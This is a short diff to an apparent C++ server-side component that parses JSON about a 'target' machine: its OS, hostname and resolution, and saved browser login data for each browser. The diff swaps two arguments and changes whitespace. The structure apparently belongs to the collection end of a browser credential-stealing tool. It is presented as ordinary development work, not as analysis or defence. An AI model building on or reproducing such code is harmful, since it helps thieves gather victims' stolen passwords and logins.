@@ -90,12 +90,12 @@ namespace ServerSide {
 
 				json::object targetInfo = jObj.at("targetInfo").as_object();  //gets all target's info
 				dataBuilder.buildTargetInfo(targetInfo.at("os").as_string().c_str(),        //builds all target's info
-											targetInfo.at("hostname").as_string().c_str(),
-											targetInfo.at("resolution").as_string().c_str());
+											targetInfo.at("resolution").as_string().c_str(),
+											targetInfo.at("hostname").as_string().c_str());
 			
 				for (auto& browser : jObj.at("Browsers").as_array()) { //iterations by browsers and their data's
 					auto browsName = browser.as_string().c_str(); //current browser name
-					dataBuilder.addBrowserData({}, std::optional(browsName)); //adds only the name to the browserData struct which is a part of the Data
+					dataBuilder.addBrowserData({},std::optional(browsName)); //adds only the name to the browserData struct which is a part of the Data
 
 					json::array loginData = jObj.at(browsName).at("loginData").as_array(); //pick all login's data of current browser
 					for (auto& elem : loginData) {                                         //parse all login's data of current browser 
